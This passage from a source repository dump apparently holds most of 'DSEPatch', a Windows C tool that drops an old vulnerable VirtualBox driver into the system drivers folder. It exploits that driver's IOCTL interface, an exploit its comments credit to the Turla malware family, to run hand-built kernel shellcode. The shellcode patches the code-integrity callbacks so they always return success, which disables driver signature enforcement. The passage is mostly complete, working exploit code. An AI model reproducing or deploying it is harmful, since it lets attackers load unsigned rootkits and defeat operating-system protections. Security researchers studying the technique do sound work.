    _Inout_		PHANDLE lphDevice
);

```

`source/DSEPatch/DSEPatch/main.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.05
*
*  DATE:        22 Jan 2019
*
*  Codename: Kawakaze
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "vboxdrv.h"

#pragma data_seg("shrd")
volatile LONG g_lApplicationInstances = 0;
#pragma data_seg()
#pragma comment(linker, "/Section:shrd,RWS")

HINSTANCE  g_hInstance;
RTL_OSVERSIONINFOW g_osv;

HANDLE	g_hVBox = INVALID_HANDLE_VALUE;
BOOL	g_VBoxInstalled = FALSE;

#define VBoxDrvSvc      TEXT("VBoxDrv")
#define supImageName    "kawakaze"
#define supImageHandle  0x1a000

#define NTOSKRNL_EXE    TEXT("ntoskrnl.exe")

#define T_PROGRAMTITLE  TEXT("DSEPatch v1.0.5 from 22 Jan 2019 ")
#define T_PROGRAMUNSUP	TEXT("[!] Unsupported WinNT version\r\n")
#define T_PROGRAMRUN    TEXT("[!] Another instance running, close it before\r\n")
#define T_PROGRAMINTRO  TEXT("(c) 2016 - 2019 DSEPatch Project\r\nSupported x64 OS : 7 and above\r\n")
#define T_VBOXDETECT	TEXT("[~] Detected VirtualBox software installation, driver backup will be done")

#define CiValidateImageHeader_7601          0
#define CiValidateImageData_7601            1

#define CiValidateImageHeader_9200_17763    4 //include skip first size element
#define CiValidateImageData_9200_17763      5 //include skip first size element


typedef PVOID(NTAPI *pfnExAllocatePool)(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes);

typedef VOID(NTAPI *pfnExFreePool)(
    _In_ PVOID P);

typedef struct _PARAM_TABLE {
    BOOL Restore;
    ULONG_PTR CiValidateImageDataPtr;
    ULONG_PTR CiValidateImageHeaderPtr;
    pfnExAllocatePool ExAllocatePool;
    pfnExFreePool ExFreePool;
} PARAM_TABLE, *PPARAM_TABLE;

#ifdef _DEBUG
#define BOOTSTRAPCODE_SIZE 2048
#else
#define BOOTSTRAPCODE_SIZE 968
#endif

//sizeof = 1024 in Release
// WARNING: shellcode DOESN'T WORK in DEBUG
typedef struct _SHELLCODE {
    BYTE InitCode[16];
    BYTE PatchCode[BOOTSTRAPCODE_SIZE];
    PARAM_TABLE ParametersBlock;
} SHELLCODE, *PSHELLCODE;

SHELLCODE *g_ShellCode;

/*
* RunExploit
*
* Purpose:
*
* VirtualBox exploit used by WinNT/Turla.
* Slightly modified version from TDL 1.14
*
*/
void RunExploit(
    _In_ LPVOID Shellcode,
    _In_ ULONG CodeSize
)
{
    SUPCOOKIE       Cookie;
    SUPLDROPEN      OpenLdr;
    DWORD           bytesIO = 0;
    RTR0PTR         ImageBase = NULL;
    ULONG_PTR       paramOut;
    PSUPLDRLOAD     pLoadTask = NULL;
    SUPSETVMFORFAST vmFast;
    SUPLDRFREE      ldrFree;
    SIZE_T          memIO;
    WCHAR           text[256];

    if (g_hVBox == INVALID_HANDLE_VALUE)
        return;

    do {
        RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
        Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
        Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
        Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
        Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        Cookie.Hdr.rc = 0;
        Cookie.u.In.u32ReqVersion = 0;
        Cookie.u.In.u32MinVersion = 0x00070002;
        RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_COOKIE,
            &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
            SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("[!] SUP_IOCTL_COOKIE call failed"), TRUE);
            break;
        }

        RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
        OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
        OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
        OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        OpenLdr.Hdr.rc = 0;
        OpenLdr.u.In.cbImage = CodeSize;
        RtlCopyMemory(OpenLdr.u.In.szName, supImageName, sizeof(supImageName));

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
            SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("[!] SUP_IOCTL_LDR_OPEN call failed"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("[+] OpenLdr.u.Out.pvImageBase = 0x"));
            u64tohex((ULONG_PTR)OpenLdr.u.Out.pvImageBase, _strend(text));
            cuiPrintText(text, TRUE);
        }

        ImageBase = OpenLdr.u.Out.pvImageBase;

        memIO = PAGE_SIZE + CodeSize;
        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, 0, &memIO,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (pLoadTask == NULL)
            break;

        pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        pLoadTask->Hdr.cbIn =
            (ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + CodeSize;
        pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
        pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
        pLoadTask->Hdr.rc = 0;
        pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
        pLoadTask->u.In.pvImageBase = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)supImageHandle;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
        pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
        RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, CodeSize);
        pLoadTask->u.In.cbImage = CodeSize;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_LOAD,
            pLoadTask, pLoadTask->Hdr.cbIn,
            pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("[!] SUP_IOCTL_LDR_LOAD call failed"), TRUE);
            break;
        }
        else {
            _strcpy(text, TEXT("[+] SUP_IOCTL_LDR_LOAD, success\r\n\tShellcode mapped at 0x"));
            u64tohex((ULONG_PTR)ImageBase, _strend(text));
            _strcat(text, TEXT(", size = 0x"));
            ultohex(CodeSize, _strend(text));
            cuiPrintText(text, TRUE);
        }

        RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
        vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        vmFast.Hdr.rc = 0;
        vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
        vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
        vmFast.u.In.pVMR0 = (LPVOID)supImageHandle;

        if (!DeviceIoControl(g_hVBox, SUP_IOCTL_SET_VM_FOR_FAST,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
            &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
        {
            cuiPrintText(TEXT("[!] SUP_IOCTL_SET_VM_FOR_FAST call failed"), TRUE);
            break;
        }
        else {
            cuiPrintText(TEXT("[+] SUP_IOCTL_SET_VM_FOR_FAST call complete"), TRUE);
        }

        cuiPrintText(TEXT("[+] SUP_IOCTL_FAST_DO_NOP"), TRUE);

        paramOut = 0;
        DeviceIoControl(g_hVBox, SUP_IOCTL_FAST_DO_NOP,
            NULL, 0,
            &paramOut, sizeof(paramOut), &bytesIO, NULL);

        cuiPrintText(TEXT("[+] SUP_IOCTL_LDR_FREE"), TRUE);

        RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
        ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
        ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
        ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
        ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
        ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
        ldrFree.Hdr.rc = 0;
        ldrFree.u.In.pvImageBase = ImageBase;

        DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_FREE,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
            &ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);

    } while (FALSE);

    if (pLoadTask != NULL) {
        memIO = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, &memIO, MEM_RELEASE);
    }

    if (g_hVBox != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hVBox);
        g_hVBox = INVALID_HANDLE_VALUE;
    }
}

/*
* StartVulnerableDriver
*
* Purpose:
*
* Load vulnerable virtualbox driver and return handle for it device.
*
*/
HANDLE StartVulnerableDriver(
    VOID
)
{
    BOOL        bCond = FALSE;
    PBYTE       DrvBuffer;
    ULONG       DataSize = 0, bytesIO;
    HANDLE      hDevice = INVALID_HANDLE_VALUE;
    WCHAR       szDriverFileName[MAX_PATH * 2];
    SC_HANDLE   schSCManager = NULL;
    LPWSTR      msg;

    DrvBuffer = VBoxDrv;
    DataSize = sizeof(VBoxDrv);

    do {

        RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
        if (!GetSystemDirectory(szDriverFileName, MAX_PATH)) {
            cuiPrintText(TEXT("[!] Error loading VirtualBox driver, GetSystemDirectory failed"), TRUE);
            break;
        }

        schSCManager = OpenSCManager(NULL,
            NULL,
            SC_MANAGER_ALL_ACCESS);

        if (schSCManager == NULL) {
            cuiPrintText(TEXT("[!] Error opening SCM database"), TRUE);
            break;
        }

        //
        // Lookup main vbox driver device,
        // if found then try to unload all possible vbox drivers,
        // where unload order is sensitive because some vbox drivers depends on each other.
        //
        if (supIsObjectExists(L"\\Device", L"VBoxDrv")) {
            cuiPrintText(TEXT("[~] Active VirtualBox found in system, attempt unload it"), TRUE);

            if (scmStopDriver(schSCManager, TEXT("VBoxNetAdp"))) {
                cuiPrintText(TEXT("[+] VBoxNetAdp driver unloaded"), TRUE);
            }
            if (scmStopDriver(schSCManager, TEXT("VBoxNetLwf"))) {
                cuiPrintText(TEXT("[+] VBoxNetLwf driver unloaded"), TRUE);
            }
            if (scmStopDriver(schSCManager, TEXT("VBoxUSBMon"))) {
                cuiPrintText(TEXT("[+] VBoxUSBMon driver unloaded"), TRUE);
            }
            Sleep(1000);
            if (scmStopDriver(schSCManager, TEXT("VBoxDrv"))) {
                cuiPrintText(TEXT("[+] VBoxDrv driver unloaded"), TRUE);
            }
        }

        //
        // If vbox installed backup it driver, do it before dropping our.
        //
        if (g_VBoxInstalled) {
            if (supBackupVBoxDrv(FALSE) == FALSE) {
                cuiPrintText(TEXT("[!] Error while doing VirtualBox driver backup"), TRUE);
                break;
            }
        }

        //
        // Drop our vboxdrv version.
        //
        _strcat(szDriverFileName, TEXT("\\drivers\\VBoxDrv.sys"));
        bytesIO = (ULONG)supWriteBufferToFile(
            szDriverFileName,
            DrvBuffer,
            (SIZE_T)DataSize);

        if (bytesIO != DataSize) {
            cuiPrintText(TEXT("[!] Error writing VirtualBox on disk"), TRUE);
            break;
        }

        //
        // If vbox not found in system install driver in scm.
        //
        if (g_VBoxInstalled == FALSE) {
            scmInstallDriver(schSCManager, VBoxDrvSvc, szDriverFileName);
        }

        //
        // Run driver.
        //
        if (scmStartDriver(schSCManager, VBoxDrvSvc) != FALSE) {

            if (scmOpenDevice(VBoxDrvSvc, &hDevice))
                msg = TEXT("[+] Vulnerable driver loaded and opened");
            else
                msg = TEXT("[!] Driver device open failure");

        }
        else {
            msg = TEXT("[!] Vulnerable driver load failure");
        }

        cuiPrintText(msg, TRUE);

    } while (bCond);

    //post cleanup
    if (schSCManager != NULL) {
        CloseServiceHandle(schSCManager);
    }
    return hDevice;
}

/*
* StopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver. If VirtualBox installed - restore original driver.
*
*/
void StopVulnerableDriver(
    VOID
)
{
    SC_HANDLE	       schSCManager;
    LPWSTR             msg;
    UNICODE_STRING     uStr;
    OBJECT_ATTRIBUTES  ObjectAttributes;

    cuiPrintText(TEXT("[+] Unloading vulnerable driver"), TRUE);

    if (g_hVBox != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hVBox);
        g_hVBox = INVALID_HANDLE_VALUE;
    }

    schSCManager = OpenSCManager(NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS);

    if (schSCManager == NULL) {
        cuiPrintText(TEXT("[!] Cannot open database, unable unload driver"), TRUE);
        return;
    }

    //stop driver in any case
    if (scmStopDriver(schSCManager, VBoxDrvSvc))
        msg = TEXT("[+] Vulnerable driver successfully unloaded");
    else
        msg = TEXT("[!] Unexpected error while unloading driver");

    cuiPrintText(msg, TRUE);

    //if VBox not installed - remove from scm database and delete file
    if (g_VBoxInstalled == FALSE) {

        if (scmRemoveDriver(schSCManager, VBoxDrvSvc))
            msg = TEXT("[+] Driver entry removed from registry");
        else
            msg = TEXT("[!] Error removing driver entry from registry");

        cuiPrintText(msg, TRUE);

        uStr.Buffer = NULL;
        uStr.Length = 0;
        uStr.MaximumLength = 0;
        RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
        InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
        if (NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
            msg = TEXT("[+] Driver file removed");
        else
            msg = TEXT("[!] Error removing driver file");

        cuiPrintText(msg, TRUE);

    }
    else {
        //VBox software present, restore original driver and exit
        if (supBackupVBoxDrv(TRUE))
            msg = TEXT("[+] Original driver restored");
        else
            msg = TEXT("[!] Unexpected error while restoring original driver");

        cuiPrintText(msg, TRUE);
    }
    CloseServiceHandle(schSCManager);
}

/*
* ExAllocatePoolTest
*
* Purpose:
*
* User mode test routine.
*
*/
PVOID NTAPI ExAllocatePoolTest(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes)
{
    PVOID P;
    UNREFERENCED_PARAMETER(PoolType);

    P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (P) RtlSecureZeroMemory(P, NumberOfBytes);

    return P;
}


/*
* ExFreePoolTest
*
* Purpose:
*
* User mode test routine.
*
*/
VOID NTAPI ExFreePoolTest(
    _In_ PVOID P)
{
    VirtualFree(P, 0, MEM_RELEASE);
}

#include <intrin.h>

typedef struct _PATCH_CODE {
    UCHAR StubCode[4];
    ULONG BeginMarker;
    PVOID CiValidateImageDataOriginal;
    PVOID CiValidateImageHeaderOriginal;
    ULONG EndMarker;
    ULONG AlwaysZero;
} PATCH_CODE, *PPATCH_CODE;

#define CI_PATCH_MARKER_BEGIN   '_URG' //GRU_
#define CI_PATCH_MARKER_END     ' x0f' //f0x

/*
* PatchRoutine
*
* Purpose:
*
* ShellCode to be executed in kernel mode.
*
*/
NTSTATUS NTAPI PatchRoutine(
    _In_ PSHELLCODE ShellCode
)
{
    PATCH_CODE *CiPatchStub;

    if (ShellCode->ParametersBlock.Restore) {

        //
        // Restore mode.
        //
        CiPatchStub = *(PATCH_CODE**)ShellCode->ParametersBlock.CiValidateImageDataPtr;
        if ((CiPatchStub->BeginMarker == CI_PATCH_MARKER_BEGIN) && (CiPatchStub->EndMarker == CI_PATCH_MARKER_END)) {

            _InterlockedExchangePointer((PVOID*)ShellCode->ParametersBlock.CiValidateImageDataPtr,
                CiPatchStub->CiValidateImageDataOriginal);

            _InterlockedExchangePointer((PVOID*)ShellCode->ParametersBlock.CiValidateImageHeaderPtr,
                CiPatchStub->CiValidateImageHeaderOriginal);

            ShellCode->ParametersBlock.ExFreePool(CiPatchStub);
        }

    }
    else {
        //
        // Patch mode.
        //
        CiPatchStub = (PATCH_CODE*)ShellCode->ParametersBlock.ExAllocatePool(NonPagedPoolExecute, PAGE_SIZE);
        if (CiPatchStub) {

            //
            // xor eax, eax
            // retn
            // int 3
            //
            CiPatchStub->StubCode[0] = 0x33;
            CiPatchStub->StubCode[1] = 0xC0;
            CiPatchStub->StubCode[2] = 0xC3;
            CiPatchStub->StubCode[3] = 0xCC;
            CiPatchStub->BeginMarker = CI_PATCH_MARKER_BEGIN;
            CiPatchStub->EndMarker = CI_PATCH_MARKER_END;
            CiPatchStub->AlwaysZero = 0;

            CiPatchStub->CiValidateImageDataOriginal = _InterlockedExchangePointer((PVOID*)ShellCode->ParametersBlock.CiValidateImageDataPtr,
                (PVOID)CiPatchStub);

            CiPatchStub->CiValidateImageHeaderOriginal = _InterlockedExchangePointer((PVOID*)ShellCode->ParametersBlock.CiValidateImageHeaderPtr,
                (PVOID)CiPatchStub);

        }
    }
    return STATUS_SUCCESS; //end of proc marker
}

/*
* PatchCiCallbacks
*
* Purpose:
*
* Preload kernel, locate callbacks and patch them.
*
*/
UINT PatchCiCallbacks(
    _In_ BOOL bRestore
)
{
    UINT uResult = ERROR_NOT_CAPABLE;
    ULONG_PTR ConvertedFuncPtr = 0;

    DWORD SizeOfImage = 0;

    HMODULE hNtOs = NULL;

    ULONG_PTR CiCallbacks = 0;
    ULONG_PTR NtOsBase = 0;

    ULONG CiValidateImageHeaderIndex, CiValidateImageDataIndex;
    ULONG ProcedureSize;

    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR szFullModuleName[MAX_PATH * 2];

    WCHAR *szErrorCiCallbacks;

    do {

        //
        // Get ntoskrnl loaded image base.
        //
        NtOsBase = supGetNtOsBase();
        if (NtOsBase) {
            _strcpy(szBuffer, TEXT("[+] Loaded ntoskrnl base = 0x"));
            u64tohex(NtOsBase, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);
        }
        else {
            cuiPrintText(TEXT("[!] Cannot query ntoskrnl loaded base, abort"), TRUE);
            uResult = ERROR_MOD_NOT_FOUND;
            break;
        }

        //
        // Map ntoskrnl copy.
        //
        szFullModuleName[0] = 0;
        if (!GetSystemDirectory(szFullModuleName, MAX_PATH)) {
            uResult = ERROR_WRONG_TARGET_NAME;
            break;
        }
        _strcat(szFullModuleName, TEXT("\\"));
        _strcat(szFullModuleName, NTOSKRNL_EXE);

        hNtOs = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (hNtOs) {
            _strcpy(szBuffer, TEXT("[+] ntoskrnl.exe loaded for pattern search at 0x"));
            u64tohex((ULONG_PTR)hNtOs, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);

            SizeOfImage = RtlImageNtHeader(hNtOs)->OptionalHeader.SizeOfImage;
            if (SizeOfImage == 0) {
                cuiPrintText(TEXT("[!] Invalid ntoskrnl SizeOfImage"), TRUE);
                uResult = ERROR_INVALID_DATA;
                break;
            }
            _strcpy(szBuffer, TEXT("[+] ntoskrnl SizeOfImage = 0x"));
            ultohex(SizeOfImage, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);
        }
        else {
            cuiPrintText(TEXT("[!] Cannot load ntoskrnl.exe"), TRUE);
            uResult = ERROR_NOT_CAPABLE;
            break;
        }

        CiCallbacks = supFindCiCallbacks(g_osv.dwBuildNumber, SizeOfImage, NtOsBase, hNtOs);
        if (CiCallbacks == 0) {
            if (g_osv.dwBuildNumber < 9200) {
                szErrorCiCallbacks = TEXT("[!] Cannot find g_CiCallbacks");
            }
            else {
                szErrorCiCallbacks = TEXT("[!] Cannot find SeCiCallbacks");
            }
            cuiPrintText(szErrorCiCallbacks, TRUE);
            uResult = ERROR_NOT_CAPABLE;
            break;
        }
        else {
            _strcpy(szBuffer, TEXT("[+] CiCallbacks found at 0x"));
            u64tohex((ULONG_PTR)CiCallbacks, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);
        }

        g_ShellCode = (SHELLCODE*)VirtualAlloc(NULL, sizeof(SHELLCODE),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

        if (g_ShellCode == NULL) {
            uResult = ERROR_NOT_ENOUGH_MEMORY;
            break;
        }

        RtlSecureZeroMemory(g_ShellCode, sizeof(SHELLCODE));

        //
        // Build initial code part.
        //
        // 00 call +5
        // 05 pop rcx
        // 07 sub rcx, 5
        // 0B jmps 10 
        // 0D int 3
        // 0E int 3
        // 0F int 3
        // 10 code

        //int 3
        memset(g_ShellCode->InitCode, 0xCC, sizeof(g_ShellCode->InitCode));

        //call +5
        g_ShellCode->InitCode[0x0] = 0xE8;
        g_ShellCode->InitCode[0x1] = 0x00;
        g_ShellCode->InitCode[0x2] = 0x00;
        g_ShellCode->InitCode[0x3] = 0x00;
        g_ShellCode->InitCode[0x4] = 0x00;

        //pop rcx
        g_ShellCode->InitCode[0x5] = 0x59;

        //sub rcx, 5
        g_ShellCode->InitCode[0x6] = 0x48;
        g_ShellCode->InitCode[0x7] = 0x83;
        g_ShellCode->InitCode[0x8] = 0xE9;
        g_ShellCode->InitCode[0x9] = 0x05;

        // jmps
        g_ShellCode->InitCode[0xA] = 0xEB;
        g_ShellCode->InitCode[0xB] = 0x04;

        if (g_osv.dwBuildNumber <= 7601) {
            CiValidateImageHeaderIndex = CiValidateImageHeader_7601;
            CiValidateImageDataIndex = CiValidateImageData_7601;
        }
        else {
            CiValidateImageHeaderIndex = CiValidateImageHeader_9200_17763;
            CiValidateImageDataIndex = CiValidateImageData_9200_17763;
        }

        g_ShellCode->ParametersBlock.CiValidateImageHeaderPtr = CiCallbacks + (sizeof(ULONG_PTR) * CiValidateImageHeaderIndex);
        g_ShellCode->ParametersBlock.CiValidateImageDataPtr = CiCallbacks + (sizeof(ULONG_PTR) * CiValidateImageDataIndex);

        //
        // Locate ExAllocatePool address
        // 
        ConvertedFuncPtr = supGetProcAddress(NtOsBase, (ULONG_PTR)hNtOs, "ExAllocatePool");
        if (ConvertedFuncPtr == 0) {
            cuiPrintText(TEXT("[!] Error, ExAllocatePool address not found"), TRUE);
            uResult = ERROR_PROC_NOT_FOUND;
            break;
        }
        else {
            _strcpy(szBuffer, TEXT("[+] ExAllocatePool 0x"));
            u64tohex(ConvertedFuncPtr, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);
        }

#ifdef _DEBUG
        g_ShellCode->ParametersBlock.ExAllocatePool = (pfnExAllocatePool)ExAllocatePoolTest;
#else
        g_ShellCode->ParametersBlock.ExAllocatePool = (pfnExAllocatePool)ConvertedFuncPtr;
#endif

        if (bRestore) {
            cuiPrintText(TEXT("[+] Attempt to restore DSE state"), TRUE);
            ConvertedFuncPtr = supGetProcAddress(NtOsBase, (ULONG_PTR)hNtOs, "ExFreePool");
            if (ConvertedFuncPtr == 0) {
                cuiPrintText(TEXT("[!] Error, ExFreePool address not found"), TRUE);
                uResult = ERROR_PROC_NOT_FOUND;
                break;
            }
            else {
                _strcpy(szBuffer, TEXT("[+] ExFreePool 0x"));
                u64tohex(ConvertedFuncPtr, _strend(szBuffer));
                cuiPrintText(szBuffer, TRUE);
            }

#ifdef _DEBUG
            g_ShellCode->ParametersBlock.ExFreePool = (pfnExFreePool)ExFreePoolTest;
#else
            g_ShellCode->ParametersBlock.ExFreePool = (pfnExFreePool)ConvertedFuncPtr;
#endif
        }
        else {
            cuiPrintText(TEXT("[+] Attempt to patch DSE"), TRUE);
        }

        g_ShellCode->ParametersBlock.Restore = bRestore;

        //
        // Copy patch routine.
        //
        ProcedureSize = supSizeOfProc((PBYTE)PatchRoutine);
        if (ProcedureSize != 0) {

            _strcpy(szBuffer, TEXT("[+] PatchCode code size = 0x"));
            ultohex(ProcedureSize, _strend(szBuffer));
            cuiPrintText(szBuffer, TRUE);

            if (ProcedureSize > sizeof(g_ShellCode->PatchCode)) {
                _strcpy(szBuffer, TEXT("[!] PatchCode code size exceeds limit, abort"));
                cuiPrintText(szBuffer, TRUE);
                uResult = ERROR_INTERNAL_ERROR;
                break;
            }
            memcpy(g_ShellCode->PatchCode, PatchRoutine, ProcedureSize);
            //supWriteBufferToFile(L"out.bin", PatchRoutine, ProcedureSize);
        }
        else {
            cuiPrintText(TEXT("[!] Patch procedure size is 0 - unexpected, abort"), TRUE);
            uResult = ERROR_INTERNAL_ERROR;
            break;
        }

#ifdef _DEBUG
        //PatchRoutine(g_ShellCode);
        //((void(*)())g_ShellCode->InitCode)();
#endif

#ifndef _DEBUG
        g_hVBox = StartVulnerableDriver();
        if (g_hVBox != INVALID_HANDLE_VALUE) {
#endif
            RunExploit(g_ShellCode, sizeof(SHELLCODE));

#ifndef _DEBUG
            StopVulnerableDriver();
        }
#endif

        uResult = ERROR_SUCCESS;

    } while (FALSE);

    if (hNtOs) FreeLibrary(hNtOs);
    if (g_ShellCode) VirtualFree(g_ShellCode, 0, MEM_RELEASE);

    return uResult;
}

/*
* ProcessCommandLine
*
* Purpose:
*
* Check command line, run patch/restore.
*
*/
UINT ProcessCommandLine(
    _In_ LPWSTR lpCommandLine
)
{
    BOOL bRestore = FALSE;

    UINT uResult = ERROR_NOT_CAPABLE;

    ULONG c;

    WCHAR szBuffer[MAX_PATH + 1];

    //
    // Command line options.
    //
    c = 0;
    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    GetCommandLineParam(lpCommandLine, 1, (LPWSTR)&szBuffer, MAX_PATH, &c);

    //
    // Check "restore" command.
    //
    if (c > 0) {
        if (_strcmpi(szBuffer, TEXT("-r")) == 0) {
            bRestore = TRUE;
        }
    }

    PatchCiCallbacks(bRestore);

    return uResult;
}

/*
* main
*
* Purpose:
*
* Program main.
*
*/
void main()
{
    LONG x;
    UINT uResult = 0;

    ULONG bytesIO;

    NTSTATUS Status;

    SYSTEM_CODEINTEGRITY_INFORMATION state;

    WCHAR szOut[200];

    do {

        cuiInitialize(FALSE, NULL);

        cuiClrScr();

        SetConsoleTitle(T_PROGRAMTITLE);
        cuiPrintText(T_PROGRAMTITLE, FALSE);
        cuiPrintText(T_PROGRAMINTRO, TRUE);

        x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
        if (x > 1) {
            cuiPrintText(T_PROGRAMRUN, TRUE);
            uResult = ERROR_ALREADY_EXISTS;
            break;
        }

        RtlSecureZeroMemory(&g_osv, sizeof(g_osv));
        g_osv.dwOSVersionInfoSize = sizeof(g_osv);
        RtlGetVersion((PRTL_OSVERSIONINFOW)&g_osv);
        if (g_osv.dwMajorVersion < 6) {
            cuiPrintText(T_PROGRAMUNSUP, TRUE);
            uResult = ERROR_UNSUPPORTED_TYPE;
            break;
        }

        _strcpy(szOut, TEXT("[+] Windows v"));
        ultostr(g_osv.dwMajorVersion, _strend(szOut));
        _strcat(szOut, TEXT("."));
        ultostr(g_osv.dwMinorVersion, _strend(szOut));
        _strcat(szOut, TEXT(" build "));
        ultostr(g_osv.dwBuildNumber, _strend(szOut));
        cuiPrintText(szOut, TRUE);

        //
        // Show Code Integrity Information.
        //
        state.CodeIntegrityOptions = 0;
        state.Length = sizeof(state);

        Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
            (PVOID)&state, sizeof(SYSTEM_CODEINTEGRITY_INFORMATION),
            &bytesIO);

        if (NT_SUCCESS(Status)) {
            if (state.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) {
                cuiPrintText(TEXT("[+] System reports CodeIntegrityOption as Enabled"), TRUE);
            }
        }

        g_VBoxInstalled = supIsVBoxInstalled();
        if (g_VBoxInstalled) {
            cuiPrintText(T_VBOXDETECT, TRUE);
        }

        __try {
            uResult = ProcessCommandLine(GetCommandLine());
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            cuiPrintText(TEXT("[=] Unrecoverable exception"), TRUE);
        }

        cuiPrintText(TEXT("[+] Exit"), TRUE);

    } while (FALSE);

    InterlockedDecrement((PLONG)&g_lApplicationInstances);
    ExitProcess(uResult);
}

```

`source/DSEPatch/DSEPatch/minirtl/_strcat.c`:

```c
#include "rtltypes.h"

char *_strcat_a(char *dest, const char *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

